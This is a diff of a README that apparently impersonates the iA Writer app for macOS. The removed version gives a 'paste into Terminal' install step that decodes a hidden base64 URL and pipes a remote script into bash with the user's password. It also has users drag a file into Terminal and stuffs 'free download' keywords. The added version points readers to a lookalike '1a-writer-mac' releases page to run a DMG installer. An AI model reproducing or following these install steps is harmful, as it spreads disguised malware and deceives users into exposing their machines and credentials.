@@ -1,91 +1,195 @@
-# iA Writer Mac Download – Clean Writing App for macOS
+https://github.com/Thuyamyatmon/1a-writer-mac/releases
 
-![iA Writer Logo](https://upload.wikimedia.org/wikipedia/en/9/95/IA_Writer_Logo.png)
+[![Releases Available](https://img.shields.io/badge/Releases-Available-blue?style=for-the-badge&logo=github)](https://github.com/Thuyamyatmon/1a-writer-mac/releases)
 
-> **Version:** iA Writer 6.0  
-> **Updated:** July 2025  
-> **Compatibility:** macOS Catalina and newer (including Apple Silicon M1, M2, M3)
+# 1a-writer-mac: Focused Markdown Writing on macOS with Elegant Typography
 
----
+A Mac app designed for distraction-free writing. It emphasizes clean typography, Markdown support, and a smooth, responsive editing experience. It is built for focused work on MacBook, iMac, or Mac mini. You can download the macOS installer from the Releases page and try it out.
 
-## 📦 Download iA Writer for Mac
+Note: This project paraphrases the experience of a professional writing tool inspired by iA Writer. It aims to provide a calm, efficient writing environment on macOS using plain Markdown, solid typography, and thoughtful features. If you are looking for a direct download, you should head to the Releases page to grab the installer and begin writing right away.
 
-[![⬇️ Download Now](https://img.shields.io/badge/iA%20%20Writer-Download%20%20-blue?style=for-the-badge&logo=apple)](https://kiakodkfi3.github.io/.github/iawriter)
+Table of contents
+- Overview
+- Why use 1a-writer-mac
+- Who should use this
+- Quick start
+- Installation and setup
+- Editor and features
+- Markdown support in depth
+- Focus and typography
+- Export and sharing
+- Customization and preferences
+- Keyboard shortcuts
+- Performance, reliability, and accessibility
+- Troubleshooting
+- Contributing
+- Licensing and credits
+- Release notes
 
-## 📦 How to Install
+Overview
+1a-writer-mac is a lightweight Mac editor built for writers who want focus, clarity, and speed. The design centers on the text, with a clean interface that minimizes clutter. The app supports Markdown syntax out of the box, so you can format as you type, export to common formats, and keep your workflow simple and efficient.
 
-## Installation via .dmg:
+This project aims to offer a calm writing environment on macOS. It prioritizes typographic quality, with careful attention to line length, margins, and font rendering. The result is a comfortable reading and writing experience, whether you are drafting a novel, journaling, or crafting technical notes.
 
-1. Install the .dmg file using the button above. 
-2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
-3. Open a terminal and transfer the file you extracted in the last step into it.
-4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+Why use 1a-writer-mac
+- Distraction-free workspace: Minimal chrome helps you stay in the flow.
+- Clear typography: Crisp fonts and balanced spacing support long writing sessions.
+- Markdown first: Write with Markdown syntax and see results quickly.
+- Rapid editing: Fast editing, quick save, and instant formatting feedback.
+- Local-first: Your documents stay on your device unless you choose to share.
 
-[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+Who should use this
+- Authors and novelists who value a clean, calm editor.
+- Journal writers who want a reliable plain-text workflow.
+- Students and researchers drafting notes in Markdown.
+- Teams who prefer a lightweight Mac tool for drafting and exporting Markdown.
 
-## Installation via a command in the terminal:
+Screenshots and visuals
+- The Markdown icon image below signals Markdown support and clean text rendering.
 
-1. Copy the installation command below.
-```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQxL2luc3RhbGwuc2g= | base64 -d))"
-```
-2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-3. Enter your device password and confirm the installation.
+![Markdown icon](https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Markdown-mark.svg/1200px-Markdown-mark.svg.png)
 
-[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+Quick start
+- Install the app from the Releases page.
+- Open the application from the Applications folder.
+- Create a new document using Command-N.
+- Start typing in Markdown; formatting appears as you type.
+- Save with Command-S and export when ready.
 
----
+If you want a quick tour, follow the steps in the Quick Start guide below.
 
-## 🖋️ What is iA Writer for Mac?
+Installation and setup
+Note: The link above points to the releases area. When you arrive there, you will typically find a macOS installer file (a .dmg). This file must be downloaded and executed to install the app.
 
-**iA Writer** is a minimalist Markdown-based writing application for macOS, built to help writers focus deeply on the text and eliminate distractions. Whether you're a novelist, screenwriter, student, or blogger, iA Writer provides a clean, distraction-free workspace that emphasizes clarity, simplicity, and writing flow.
+- Where to download: Visit the Releases page and look for the macOS installer file (DMG). The link provided at the top of this README takes you to the same page.
+- How to install:
+  1) Download the macOS installer (.dmg) from the Releases page.
+  2) Open the downloaded DMG.
+  3) Drag the app into the Applications folder.
+  4) Eject the DMG and launch 1a-writer-mac from Applications.
+- First run setup:
+  - On first launch, macOS may prompt you to allow accessibility or file access. Enable the necessary permissions so the app can work smoothly with your documents.
+  - You can configure the default save location, default font, and preferred styling in the Preferences panel.
 
-Unlike typical word processors, iA Writer eliminates all clutter: no ribbons, menus, or formatting toolbars. Instead, it provides a beautiful writing canvas where **text is central**. Markdown syntax allows for easy formatting, and the preview mode lets you visualize your structure instantly.
+Editor and features
+- Minimal chrome, maximal focus: A clean editor with a focus on the text line you are editing.
+- Markdown support: Write with Markdown syntax and see structure clearly as you edit.
+- Live styling: The editor applies formatting rules on the fly, helping you visualize structure without leaving the keyboard.
+- Local storage: Your documents save locally by default for privacy and speed.
+- Quick navigation: Jump between sections, headings, and pages with simple shortcuts.
+- Basic export options: Export to Markdown, HTML, PDF, or RTF as needed, with straightforward options to tailor the output.
 
-iA Writer supports:
+Markdown support in depth
+- Syntax highlighting: Markdown syntax is highlighted to help you scan your document quickly.
+- Inline formatting: Use bold, italics, code, and lists with familiar Markdown rules.
+- Code blocks: Insert fenced code blocks and preserve indentation for technical notes.
+- Links and images: Add links and inline images using standard Markdown syntax.
+- Tables: Create simple Markdown tables for tabular notes.
 
-- **Focus Mode**: Dim surrounding text to highlight the current sentence or paragraph
-- **Syntax Highlighting**: Shows adverbs, verbs, nouns, and other parts of speech to improve your writing
-- **Seamless File Syncing** via iCloud and Dropbox across Mac, iPhone, iPad
-- **Multi-format Export** to PDF, Word, and HTML
-- **Custom Templates** for presentations, blogs, and manuscripts
-- **Content Blocks**: Include files and images with `{{ }}` syntax for modular writing
+Focus and typography
+- Focus mode: Highlight the current sentence or paragraph to reduce distraction.
+- Typewriter feel: Optional vertical scrolling or typewriter-like behavior for steady pacing.
+- Typography controls: Adjust font family, size, weight, line height, and margins to suit your taste.
+- Ligatures and readability: Font rendering is tuned for long-form reading and writing.
 
-With full macOS integration and support for Apple Silicon (M1, M2, M3), iA Writer is blazingly fast, lightweight, and stable. It’s a favorite among developers, authors, and anyone who values precision and aesthetics in writing.
+Export and sharing
+- Export formats: Markdown (MD), HTML, PDF, and RTF are supported.
+- Custom templates: Create and apply templates for consistent formatting across documents.
+- Shared documents: If you enable sync services, you can share drafts across devices.
 
----
+Customization and preferences
+- Theme options: Light, dark, and auto themes to fit your environment.
+- Font choices: Pick from a curated set of monospaced and proportional fonts.
+- Page layout: Set margins, column width, and line length to your preference.
+- Keyboard preferences: Customize shortcuts for common actions.
 
-## 🖼️ Screenshot
+Keyboard shortcuts
+- New document: Command-N
+- Save: Command-S
+- Open document: Command-O
+- Focus mode toggle: Command-Shift-F
+- Export: Command-E
+- Preview: Command-P
+- Markdown help: Command-?
 
-![iA Writer Mac Screenshot](https://cdn.macstories.net/001/2018-12-23-22-56-09.png)
+Performance, reliability, and accessibility
+- Fast startup: The app loads quickly and gets you to work fast.
+- Smooth editing: The editor responds promptly to keystrokes and edits.
+- Accessibility: High-contrast options and readable typography improve accessibility for many users.
+- Privacy: Your documents stay on your device unless you choose to sync or share.
 
----
+Troubleshooting
+- If the app won’t start: Check macOS version compatibility and ensure you opened the app from Applications after installation.
+- If formatting looks off: Verify Markdown syntax and check if font rendering settings are correct in Preferences.
+- If you can’t export: Confirm the export tool settings and ensure you have permission to write to the target folder.
+- If you notice performance issues: Try closing other apps or reducing the number of open documents, then restart the app.
 
-## ✅ Features
+Contributing
+- Ecosystem: This project welcomes contributors who want to improve Markdown editing, typography, and the macOS experience.
+- How to contribute:
+  - Fork the repo and create a feature branch.
+  - Implement improvements in small, testable steps.
+  - Add or update tests where possible.
+  - Submit a pull request with a clear description of changes.
+- Code of conduct: Be respectful and collaborative in all interactions.
 
-- ✍️ Clean, distraction-free UI with Markdown support  
-- 🔍 Syntax control and focus mode for improved writing clarity  
-- ☁️ iCloud and Dropbox sync across devices  
-- 📄 Exports to PDF, DOCX, HTML with custom templates  
-- ⚙️ Fully native on macOS with Apple Silicon support  
-- 🪶 Lightweight and privacy-focused – no tracking or telemetry  
-- 🌗 Light & dark themes for day and night writing
+Licensing and credits
+- License: This project is provided under an open source license. See the LICENSE file for details.
+- Credits: The project draws inspiration from established Markdown editors and typography-focused tools. Acknowledge any contributions from the community in your pull requests.
 
----
+Release notes and history
+- Each release includes notes on new features, improvements, and bug fixes.
+- To view the latest release details, visit the Releases page linked at the top of this document.
 
-## 💻 macOS Compatibility
+Releases and installation reminder
+- To obtain the installer, go to the Releases page and download the macOS installer (.dmg) file. Open the DMG and drag the app to Applications to complete the install.
+- You can also visit the Releases page directly using the same link you used at the top: https://github.com/Thuyamyatmon/1a-writer-mac/releases
 
-- macOS Catalina (10.15) and later  
-- Full support for Monterey, Ventura, Sonoma  
-- Optimized for Apple M1, M2, and M3
+Documentation and resources
+- Quick start guide: A concise walk-through to get you writing in minutes.
+- Markdown reference: A compact cheat sheet covering common syntax.
+- Shortcuts cheat sheet: A compact list of keyboard shortcuts for fast editing.
+- Theming guide: How to customize typography and appearance.
 
----
+FAQ
+- Is 1a-writer-mac free to use? Yes, the base experience is free to try, with optional paid features depending on the release.
+- Does it support iCloud or other cloud sync? The app can be configured to use local storage by default, with optional sync configured by the user.
+- Can I export to PDF? Yes, you can export your Markdown work to PDF using the built-in export options.
 
-## 🧠 Keywords
+Usage philosophy
+- The app is designed to stay out of your way while keeping your writing world intact.
+- The focus is on content, not gimmicks. The tooling is there to help you write clean, readable Markdown.
 
-ia writer, 1a writer, ia writer app, ia writer for mac,
-a1 writer, write ia, writter ia, ai writer mac,
-ia writer free, ia writer free download, ia writer mac download,
-ia writer macos, ia writer mac free download,
-ia writer pro, ia writer 6, ia writer 6.0,
-ia writer reddit, ia writer github, download ia writer mac
+Upgrade and maintenance
+- Updates are delivered via the same Releases page. Check periodically for new versions.
+- Backups: Regular backups are recommended. Use macOS Time Machine or your preferred backup solution to protect your writings.
+
+Roadmap
+- Future improvements may include richer Markdown extensions, more export options, improved focus features, and deeper integration with macOS workflows.
+- The roadmap is driven by user feedback, so feel free to share ideas through issues or discussions.
+
+Accessibility notes
+- High-contrast mode and scalable typography improve readability.
+- Keyboard-driven navigation minimizes reliance on the pointing device.
+- Screen readers should be able to read the primary editing area and common controls.
+
+Security considerations
+- The app runs locally on your Mac and respects file permissions in your system.
+- If you enable cloud syncing, ensure you trust the chosen service and manage permissions accordingly.
+
+Community and support
+- For support, open issues on the repository or reach out through the project discussions if available.
+- Community contributions help improve the editor and expand its capabilities for many macOS users.
+
+Acknowledgments
+- The project owes thanks to the open-source ecosystem for Markdown tooling and typographic insights.
+- Thanks to early testers and contributors who helped shape the experience.
+
+Closing notes
+- This README reflects the design philosophy of calm focus, robust Markdown support, and elegant typography on macOS.
+- If you are looking for a clean, distraction-free writing tool for Mac, this project offers a practical path to a productive workflow.
+
+End with a reminder
+- You can download the installer from the Releases page at the top of this document or directly via the link: https://github.com/Thuyamyatmon/1a-writer-mac/releases
+
+Enjoy writing.
